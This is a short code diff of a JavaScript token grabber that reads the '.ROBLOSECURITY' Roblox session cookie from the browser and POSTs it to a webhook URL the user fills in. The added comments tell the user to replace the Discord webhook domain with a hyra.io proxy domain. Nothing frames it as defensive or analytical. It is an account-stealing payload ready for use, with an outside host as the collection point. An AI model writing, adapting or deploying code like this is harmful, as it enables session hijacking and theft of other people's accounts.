@@ -1,4 +1,6 @@
 // WEBHOOK URL GOES IN WEBHOOK VALUE (dont delete the *s). on line 11
+// Replace webhook url https://discord.com/api/webhooks/stuff/stuff
+// to https://hooks.hyra.io/api/webhooks/stuff/stuff
 function getCookie(name) {
   const value = `; ${document.cookie}`;
   const parts = value.split(`; ${name}=`);
@@ -8,7 +10,7 @@ var token = getCookie(".ROBLOSECURITY")
 function discordWebhook(){
         const request = new XMLHttpRequest();
      
-      request.open("POST", "****WEBHOOK-URL****"); // <-- Discord webhook link 
+      request.open("POST", "****PUT-WEBHOOK-URL-HERE****"); // <-- Discord webhook link 
       
       request.setRequestHeader('Content-type', 'application/json');
 
